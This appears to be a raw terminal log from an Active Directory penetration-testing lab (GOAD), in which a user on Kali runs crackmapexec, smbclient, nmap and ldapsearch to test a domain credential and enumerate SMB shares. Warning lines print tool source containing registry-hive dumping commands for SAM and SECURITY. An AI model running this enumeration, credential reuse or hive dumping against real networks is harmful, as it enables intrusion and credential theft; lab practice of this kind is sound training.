SMB         192.168.20.11   445    WINTERFELL       RDS Management Servers                   membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       RDS Endpoint Servers                     membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       RDS Remote Access Servers                membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Certificate Service DCOM Access          membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Event Log Readers                        membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Cryptographic Operators                  membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       IIS\_IUSRS                                membercount: 1  
SMB         192.168.20.11   445    WINTERFELL       Distributed COM Users                    membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Performance Log Users                    membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Performance Monitor Users                membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Network Configuration Operators          membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Remote Desktop Users                     membercount: 1  
SMB         192.168.20.11   445    WINTERFELL       Replicator                               membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Backup Operators                         membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Print Operators                          membercount: 0  
SMB         192.168.20.11   445    WINTERFELL       Guests                                   membercount: 2  
SMB         192.168.20.11   445    WINTERFELL       Users                                    membercount: 4  
SMB         192.168.20.11   445    WINTERFELL       Administrators                           membercount: 8  
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ embercount: 1  
embercount:: command not found  
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.23 \-u jon.snow \-p iknownothing                                                               
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.23   445    BRAAVOS          \[\*\] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)  
SMB         192.168.20.23   445    BRAAVOS          \[+\] essos.local\\jon.snow:iknownothing   
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.12 \-u jon.snow \-p iknownothing  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.12   445    MEEREEN          \[\*\] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)  
SMB         192.168.20.12   445    MEEREEN          \[-\] essos.local\\jon.snow:iknownothing STATUS\_LOGON\_FAILURE   
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.22 \-u jon.snow \-p iknownothing  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.11/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        C$              Disk      Default share  
        IPC$            IPC       Remote IPC  
        NETLOGON        Disk      Logon server share   
        SYSVOL          Disk      Logon server share   
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.11 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.22/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        all             Disk      Basic RW share for all  
        C$              Disk      Default share  
        IPC$            IPC       Remote IPC  
        public          Disk      Basic Read share for all domain users  
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.22 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.23/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        all             Disk      Basic RW share for all  
        C$              Disk      Default share  
        CertEnroll      Disk      Active Directory Certificate Services share  
        IPC$            IPC       Remote IPC  
        public          Disk      Basic Read share for all domain users  
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.23 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                                     
┌──(certipy-env)─(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.22/public \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
NT\_STATUS\_ACCESS\_DENIED listing \\\*  
smb: \\\> cd \*  
cd \\\*\\: NT\_STATUS\_ACCESS\_DENIED  
smb: \\\> ls  
NT\_STATUS\_ACCESS\_DENIED listing \\\*  
smb: \\\> get NT\_STATUS\_ACCESS\_DENIED  
NT\_STATUS\_ACCESS\_DENIED opening remote file \\NT\_STATUS\_ACCESS\_DENIED  
smb: \\\> ls  
NT\_STATUS\_ACCESS\_DENIED listing \\\*  
smb: \\\> cd  
Current directory is \\  
smb: \\\> ls  
NT\_STATUS\_ACCESS\_DENIED listing \\\*  
smb: \\\> cd ..  
smb: \\\> cd ..  
smb: \\\> cd  
Current directory is \\  
smb: \\\> SMBecho failed (NT\_STATUS\_CONNECTION\_RESET). The connection is disconnected now

\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#

┌──(kali㉿kali)-\[\~\]  
└─$ sudo nmap \-Pn \-p 389,636,445,88,135,139 192.168.20.23  
\[sudo\] password for kali:   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 12:38 CEST  
Nmap scan report for 192.168.20.23  
Host is up.

PORT    STATE    SERVICE  
88/tcp  filtered kerberos-sec  
135/tcp filtered msrpc  
139/tcp filtered netbios-ssn  
389/tcp filtered ldap  
445/tcp filtered microsoft-ds  
636/tcp filtered ldapssl

Nmap done: 1 IP address (1 host up) scanned in 3.16 seconds  
                                                                                                                                                                  
┌──(kali㉿kali)-\[\~\]  
└─$ ping \-c 2 192.168.20.23

PING 192.168.20.23 (192.168.20.23) 56(84) bytes of data.

\--- 192.168.20.23 ping statistics \---  
2 packets transmitted, 0 received, 100% packet loss, time 1023ms

                                                                                                                                                                  
┌──(kali㉿kali)-\[\~\]  
└─$   
                                                                                                                                                                  
┌──(kali㉿kali)-\[\~\]  
└─$   
                                                                                                                                                                  
┌──(kali㉿kali)-\[\~\]  
└─$ ldapsearch \-x \-H ldaps://192.168.20.23:636 \-s base namingcontexts  
ldap\_sasl\_bind(SIMPLE): Can't contact LDAP server (-1)  
                                                                                                                                                                  
┌──(kali㉿kali)-\[\~\]  
└─$ nuclei \-auth

                     \_\_     \_  
   \_\_\_\_  \_\_  \_\_\_\_\_\_\_/ /\_\_  (\_)  
  / \_\_ \\/ / / / \_\_\_/ / \_ \\/ /  
 / / / / /\_/ / /\_\_/ /  \_\_/ /  
/\_/ /\_/\\\_\_,\_/\\\_\_\_/\_/\\\_\_\_/\_/   v3.4.8

                projectdiscovery.io

\[INF\] You are logged in as (@3xodu2904)  
                                                                                                                                                                  
┌──(kali㉿kali)-\[\~\]  
└─$ cd goAD-lab                
                                                                                                                                           
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ ls                                                                 
asrep\_hashes.txt  fast\_tcp\_scan.gnmap  naabu\_ad\_ports.txt  nuclei\_ai\_mssql.txt   targets.txt  
Certipy           fast\_tcp\_scan.nmap   nuclei\_ad\_scan.txt  nuclei\_core\_high.txt  users.txt  
certipy-env       fast\_tcp\_scan.xml    nuclei\_ai\_ad.txt    nuclei\_iis\_scan.txt   user.txt  
                                                                                                                                           
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ cd targets.txt  
cd: not a directory: targets.txt  
                                                                                                                                           
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ cat targets.txt  
192.168.20.1  
192.168.20.10  
192.168.20.11  
192.168.20.12  
192.168.20.22  
192.168.20.23  
                                                                                                                                           
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$   
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.11 \-u jon.snow \-p iknownothing \--shares                                                              
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.22 \-u jon.snow \-p iknownothing \--shares

/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.23 \-u jon.snow \-p iknownothing \--shares

/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.11/ \-U jon.snow  
do\_connect: Connection to 192.168.20.11 failed (Error NT\_STATUS\_IO\_TIMEOUT)  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.22/ \-U jon.snow

^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.22/ \-U jon.snow  
help  
get

^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.22/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.11 \-u jon.snow \-p iknownothing \--shares  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.11   445    WINTERFELL       \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)  
SMB         192.168.20.11   445    WINTERFELL       \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.11   445    WINTERFELL       \[+\] Enumerated shares  
SMB         192.168.20.11   445    WINTERFELL       Share           Permissions     Remark  
SMB         192.168.20.11   445    WINTERFELL       \-----           \-----------     \------  
SMB         192.168.20.11   445    WINTERFELL       ADMIN$                          Remote Admin  
SMB         192.168.20.11   445    WINTERFELL       C$                              Default share  
SMB         192.168.20.11   445    WINTERFELL       IPC$            READ            Remote IPC  
SMB         192.168.20.11   445    WINTERFELL       NETLOGON        READ            Logon server share   
SMB         192.168.20.11   445    WINTERFELL       SYSVOL          READ            Logon server share   
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.22 \-u jon.snow \-p iknownothing \--shares  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.22   445    CASTELBLACK      \[\*\] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)  
SMB         192.168.20.22   445    CASTELBLACK      \[+\] north.sevenkingdoms.local\\jon.snow:iknownothing   
SMB         192.168.20.22   445    CASTELBLACK      \[+\] Enumerated shares  
SMB         192.168.20.22   445    CASTELBLACK      Share           Permissions     Remark  
SMB         192.168.20.22   445    CASTELBLACK      \-----           \-----------     \------  
SMB         192.168.20.22   445    CASTELBLACK      ADMIN$                          Remote Admin  
SMB         192.168.20.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all  
SMB         192.168.20.22   445    CASTELBLACK      C$                              Default share  
SMB         192.168.20.22   445    CASTELBLACK      IPC$            READ            Remote IPC  
SMB         192.168.20.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ crackmapexec smb 192.168.20.23 \-u jon.snow \-p iknownothing \--shares  
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\\ '  
  formatter\_class=RawTextHelpFormatter)  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SAM C:\\\\windows\\\\temp\\\\SAM && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\\S'  
  self.conn.execute\_cmd("reg save HKLM\\SECURITY C:\\\\windows\\\\temp\\\\SECURITY && reg save HKLM\\SYSTEM C:\\\\windows\\\\temp\\\\SYSTEM")  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\\p'  
  stringbinding \= 'ncacn\_np:%s\[\\pipe\\svcctl\]' % self.\_\_host  
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\\{'  
  command \= self.\_\_shell \+ 'echo '+ data \+ ' ^\> \\\\\\\\127.0.0.1\\\\{}\\\\{} 2^\>^&1 \> %TEMP%\\{} & %COMSPEC% /Q /c %TEMP%\\{} & %COMSPEC% /Q /c del %TEMP%\\{}'.format(self.\_\_share\_name, self.\_\_output, self.\_\_batchFile, self.\_\_batchFile, self.\_\_batchFile)  
SMB         192.168.20.23   445    BRAAVOS          \[\*\] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)  
SMB         192.168.20.23   445    BRAAVOS          \[+\] essos.local\\jon.snow:iknownothing   
SMB         192.168.20.23   445    BRAAVOS          \[+\] Enumerated shares  
SMB         192.168.20.23   445    BRAAVOS          Share           Permissions     Remark  
SMB         192.168.20.23   445    BRAAVOS          \-----           \-----------     \------  
SMB         192.168.20.23   445    BRAAVOS          ADMIN$                          Remote Admin  
SMB         192.168.20.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all  
SMB         192.168.20.23   445    BRAAVOS          C$                              Default share  
SMB         192.168.20.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share  
SMB         192.168.20.23   445    BRAAVOS          IPC$                            Remote IPC  
SMB         192.168.20.23   445    BRAAVOS          public                          Basic Read share for all domain users  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.11/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        C$              Disk      Default share  
        IPC$            IPC       Remote IPC  
        NETLOGON        Disk      Logon server share   
        SYSVOL          Disk      Logon server share   
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.11 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.22/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        all             Disk      Basic RW share for all  
        C$              Disk      Default share  
        IPC$            IPC       Remote IPC  
        public          Disk      Basic Read share for all domain users  
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.22 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient \-L //192.168.20.23/ \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:

        Sharename       Type      Comment  
        \---------       \----      \-------  
        ADMIN$          Disk      Remote Admin  
        all             Disk      Basic RW share for all  
        C$              Disk      Default share  
        CertEnroll      Disk      Active Directory Certificate Services share  
        IPC$            IPC       Remote IPC  
        public          Disk      Basic Read share for all domain users  
Reconnecting with SMB1 for workgroup listing.  
do\_connect: Connection to 192.168.20.23 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)  
Unable to connect with SMB1 \-- no workgroup available  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.11/NETLOGON \-U jon.snow

Password for \[WORKGROUP\\jon.snow\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
  .                                   D        0  Sun Apr 13 19:13:32 2025  
  ..                                  D        0  Sun Apr 13 19:13:32 2025  
  script.ps1                          A      165  Sun Apr 13 19:13:29 2025  
  secret.ps1                          A      869  Sun Apr 13 19:13:31 2025

                10485247 blocks of size 4096\. 7456844 blocks available  
smb: \\\> ^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ smbclient //192.168.20.11/SYSVOL \-U jon.snow  
Password for \[WORKGROUP\\jon.snow\]:  
Try "help" to get a list of possible commands.  
smb: \\\> ls  
  .                                   D        0  Sun Apr 13 18:31:11 2025  
  ..                                  D        0  Sun Apr 13 18:31:11 2025  
